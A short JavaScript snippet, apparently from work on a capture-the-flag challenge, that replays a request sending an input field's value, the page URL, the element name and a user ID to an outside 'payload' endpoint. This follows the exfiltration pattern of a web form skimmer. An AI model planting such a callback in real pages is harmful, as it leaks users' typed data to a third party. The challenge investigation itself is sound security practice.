// Simulating the POST request as described in the code
const simulatePostRequest = async () => {
    const postData = {
        value: "some input data", // Replace with whatever value you'd like
        url: "https://damctf.xyz/challs", // Current URL of the page
        ele: "inputName", // The name of the input element
        user: "CacheTheStamp3de" // User identifier
    };

    const response = await fetch("https://mwaas.el1t3.fun/payload", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(postData),
    });

    const data = await response.json(); // Get the response as JSON
    console.log(data); // Output the response to the console
};

// Trigger the simulated POST request
simulatePostRequest();
